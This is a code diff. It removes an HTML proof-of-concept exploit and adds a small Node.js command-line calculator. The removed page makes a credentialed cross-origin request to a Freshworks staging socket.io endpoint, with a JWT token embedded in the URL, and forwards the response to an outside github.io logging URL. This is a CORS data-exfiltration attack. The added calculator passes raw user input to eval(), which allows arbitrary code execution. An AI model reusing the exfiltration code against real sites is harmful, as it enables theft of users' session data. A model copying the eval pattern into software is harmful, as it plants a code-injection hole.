@@ -1,15 +1,22 @@
-<html>
-  <body>
-    <script> 
-       var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://rts-staging.freshworksapi.com/socket.io/?accId=yNbWRwo4&userId=Nwvga9XYW8v1ogbx&token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODI1ODcyNzIsImFjY0lkIjoieU5iV1J3bzQiLCJ1c2VySWQiOiJOd3ZnYTlYWVc4djFvZ2J4IiwiY3JlZGVudGlhbHMiOlt7InJlc291cmNlIjoiTnd2Z2E5WFlXOHYxb2dieCIsInBlcm1zIjpbInN1YnNjcmliZSIsInNlbmQiXSwiZXhwaXJlIjoiMTY4MjU4NzI3MjA3NCJ9XX0.5N9S4ejIOln94nR7lE9lsyKsKEce2gm6l8N6WITjOJQ&EIO=3&transport=polling&t=OUTZYnw.0&b64=1',true); 
-req.withCredentials = true;
-req.send();
+const readline = require('readline');
 
-function reqListener() {
-    location='//hemar0605.github.io/secondsite/log?key='+this.responseText; 
-   };
- </script>
-  </body>
-</html>
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
+
+function calculator() {
+  rl.question('Enter an expression: ', (input) => {
+    try {
+      const result = eval(input);
+      console.log(`Result: ${result}`);
+    } catch (error) {
+      console.error(`Error: ${error.message}`);
+    }
+    calculator();
+  });
+}
+
+console.log('Welcome to the calculator!');
+calculator();
+
